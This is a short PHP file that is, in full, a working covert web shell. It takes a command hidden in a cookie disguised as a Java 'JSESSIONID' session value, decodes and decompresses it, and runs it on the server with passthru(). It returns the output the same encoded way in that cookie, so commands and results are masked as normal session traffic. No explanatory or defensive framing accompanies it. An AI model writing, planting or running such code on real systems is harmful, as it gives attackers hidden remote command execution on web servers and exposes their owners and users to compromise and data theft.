<?php
ob_start();
passthru(gzdecode(base64_decode($_COOKIE["JSESSIONID"])));
$r = base64_encode(gzencode(ob_get_contents(),9));
setcookie("JSESSIONID", $r);
ob_end_clean(); 
?>
